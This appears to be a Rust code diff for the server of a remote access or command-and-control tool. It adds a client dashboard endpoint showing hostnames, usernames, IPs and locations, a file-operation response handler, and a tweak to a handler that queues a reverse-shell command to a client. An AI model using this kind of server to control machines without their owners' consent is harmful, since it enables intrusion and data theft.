@@ -5,6 +5,7 @@ use axum::{
     Json,
 };
 use common::message::{ClientInfo, CommandRequest, CommandResponse, Message, ShellData};
+use tracing::info;
 
 /// Client registration handler
 pub async fn register_client(
@@ -115,6 +116,52 @@ pub async fn api_clients(State(state): State<AppState>) -> Json<Vec<ClientInfo>>
     Json(clients_vec)
 }
 
+/// Get all clients with display info (used by web UI dashboard)
+pub async fn api_clients_display(State(state): State<AppState>) -> Json<serde_json::Value> {
+    let clients = state.client_manager.get_clients().await;
+    let current_timestamp = chrono::Utc::now().timestamp();
+
+    let display_clients: Vec<crate::handlers::web::DisplayClientInfo> = clients
+        .into_iter()
+        .map(|c| {
+            let is_online =
+                (current_timestamp - c.last_seen.timestamp()) < state.config.client_timeout as i64;
+            crate::handlers::web::DisplayClientInfo {
+                id: c.id,
+                hostname: c.hostname,
+                username: c.username,
+                os: c.os,
+                arch: c.arch,
+                ip: c.ip,
+                country_info: c.country_info,
+                cpu_brand: c.cpu_brand,
+                cpu_frequency: c.cpu_frequency,
+                cpu_cores: c.cpu_cores,
+                memory: c.memory,
+                total_disk_space: c.total_disk_space,
+                available_disk_space: c.available_disk_space,
+                connected_at: c.connected_at,
+                last_seen: c.last_seen,
+                is_online,
+            }
+        })
+        .collect();
+
+    let online_clients_count = display_clients.iter().filter(|c| c.is_online).count();
+    let os_types_count = display_clients
+        .iter()
+        .map(|c| c.os.as_str())
+        .collect::<std::collections::HashSet<_>>()
+        .len();
+
+    Json(serde_json::json!({
+        "clients": display_clients,
+        "online_clients_count": online_clients_count,
+        "os_types_count": os_types_count,
+        "total_clients": display_clients.len()
+    }))
+}
+
 /// Get command results for a specific client (used by web UI)
 pub async fn api_command_results(
     State(state): State<AppState>,
@@ -142,10 +189,50 @@ pub async fn initiate_reverse_shell(
         client_id: client_id.clone(),
         command: "REVERSE_SHELL".to_string(),
         args: vec![session_id],
+        message_id: None, // No event-driven response needed for reverse shell
     };
 
     state.audit_logger.log_command_execution(&command);
     state.client_manager.add_command(&client_id, command).await;
+
+    Ok(StatusCode::OK)
+}
+
+/// Handle file operation response from clients
+pub async fn handle_file_operation_response(
+    State(state): State<AppState>,
+    Path(client_id): Path<String>,
+    Json(message): Json<Message>,
+) -> Result<StatusCode, StatusCode> {
+    info!(
+        "Received file operation response from client {}: message_id={}, payload_size={}",
+        client_id,
+        message.id,
+        message.payload.len()
+    );
+
+    // Log the payload for debugging
+    if let Ok(payload_str) = String::from_utf8(message.payload.clone()) {
+        info!("File operation response payload: {}", payload_str);
+    }
+
+    // Try event-driven notification first
+    if state.notify_response(&message.id, message.clone()).await {
+        info!(
+            "Successfully notified event-driven listener for message {}",
+            message.id
+        );
+    } else {
+        // Fall back to legacy storage method
+        state
+            .client_manager
+            .add_file_operation_response(&client_id, message)
+            .await;
+        info!(
+            "Stored file operation response for client {} (legacy mode)",
+            client_id
+        );
+    }
 
     Ok(StatusCode::OK)
 }
